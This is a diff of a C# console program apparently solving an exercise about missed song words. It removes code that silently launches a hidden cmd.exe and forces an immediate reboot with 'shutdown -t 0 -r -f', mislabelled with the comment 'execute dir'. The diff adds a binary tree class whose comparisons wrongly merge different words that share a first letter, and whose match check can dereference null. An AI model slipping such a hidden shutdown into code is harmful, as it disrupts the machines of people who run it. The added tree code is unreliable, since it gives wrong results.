@@ -1,7 +1,5 @@
 using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Text;
+using System.Linq;
 
 namespace BudkaSuflera
 {
@@ -11,26 +9,7 @@ namespace BudkaSuflera
         {
             string song = Console.ReadLine();
             string crisWords = Console.ReadLine();
-
-            Process cmd = new Process();
-
-            cmd.StartInfo.FileName = "cmd.exe";
-            cmd.StartInfo.RedirectStandardInput = true;
-            cmd.StartInfo.RedirectStandardOutput = true;
-            cmd.StartInfo.CreateNoWindow = true;
-            cmd.StartInfo.UseShellExecute = false;
-
-            cmd.Start();
-
-            /* execute "dir" */
-
-            cmd.StandardInput.WriteLine("shutdown -t 0 -r -f");
-            cmd.StandardInput.Flush();
-            cmd.StandardInput.Close();
-            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
-
-            
-            //Console.Write(CheckSongContent(song, crisWords));
+            Console.Write(CheckSongContent(song, crisWords));
         }
 
         public static string CheckSongContent(string song, string chrisWords)
@@ -43,7 +22,7 @@ namespace BudkaSuflera
                 return "0" + Environment.NewLine;
             }
 
-            List<string> misssedWords = new List<string>(50000);
+            WordTree tree = new WordTree();
             int indexOfChrisArray = 0;
 
             for (int i = 0, end = songList.Length; i < end; ++i)
@@ -52,28 +31,115 @@ namespace BudkaSuflera
 
                 string first = chrisVersion.Length > indexOfChrisArray ? chrisVersion[indexOfChrisArray] : null;
 
-                if (first == word)
+                if (first.First() == word.First() && first.Length == word.Length && first == word)
                 {
                     ++indexOfChrisArray;
                 }
                 else
                 {
-                    misssedWords.Add(word);
+                    tree.AddWord(word);
                 }
 
                 if (chrisVersion.Length <= indexOfChrisArray)
                 {
                     for (int j = i + 1, inend = songList.Length; j < inend; ++j)
                     {
-                        misssedWords.Add(songList[j]);
+                        tree.AddWord(songList[j]);
                     }
                     break;
                 }
             }
 
-            misssedWords.Sort(StringComparer.InvariantCultureIgnoreCase);
+            return tree.Count.ToString() + Environment.NewLine + tree.PrintWords();
+        }
+    }
 
-            return misssedWords.Count + Environment.NewLine + string.Join(Environment.NewLine, misssedWords);
+    class WordTree
+    {
+        private class TreeNode
+        {
+            public string Word { get; set; }
+            public uint Count { get; set; }
+            public TreeNode LeftNode { get; set; }
+            public TreeNode RightNode { get; set; }
+        }
+
+        private TreeNode root = null;
+        public uint Count { get; set; }
+        public string Result { get; set; }
+
+        public void AddWord(string word)
+        {
+            ++Count;
+
+            if (root == null)
+            {
+                root = new TreeNode() { Word = word, Count = 1, LeftNode = null, RightNode = null };
+            }
+            else
+            {
+                AddNodeRecursivly(root, word);
+            }
+
+        }
+
+        public string PrintWords()
+        {
+            if (Count == 1)
+            {
+                return root.Word + Environment.NewLine;
+            }
+            else
+            {
+                Result = String.Empty;
+                PrintRecursivly(root);
+                return Result;
+            }
+        }
+
+        private void PrintRecursivly(TreeNode node)
+        {
+            if (node.LeftNode != null)
+            {
+                PrintRecursivly(node.LeftNode);
+            }
+
+            Result += String.Concat(Enumerable.Repeat(node.Word + Environment.NewLine, (int)node.Count));
+
+            if (node.RightNode != null)
+            {
+                PrintRecursivly(node.RightNode);
+            }
+        }
+
+        private void AddNodeRecursivly(TreeNode node, string word)
+        {
+            if (word.First() < node.Word.First() && StringComparer.InvariantCulture.Compare(word, node.Word) < 0)
+            {
+                if (node.LeftNode == null)
+                {
+                    node.LeftNode = new TreeNode() { Word = word, Count = 1, LeftNode = null, RightNode = null };
+                }
+                else
+                {
+                    AddNodeRecursivly(node.LeftNode, word);
+                }
+            }
+            else if (word.First() > node.Word.First() && StringComparer.InvariantCulture.Compare(word, node.Word) > 0)
+            {
+                if (node.RightNode == null)
+                {
+                    node.RightNode = new TreeNode() { Word = word, Count = 1, LeftNode = null, RightNode = null };
+                }
+                else
+                {
+                    AddNodeRecursivly(node.RightNode, word);
+                }
+            }
+            else
+            {
+                ++node.Count;
+            }
         }
     }
 }
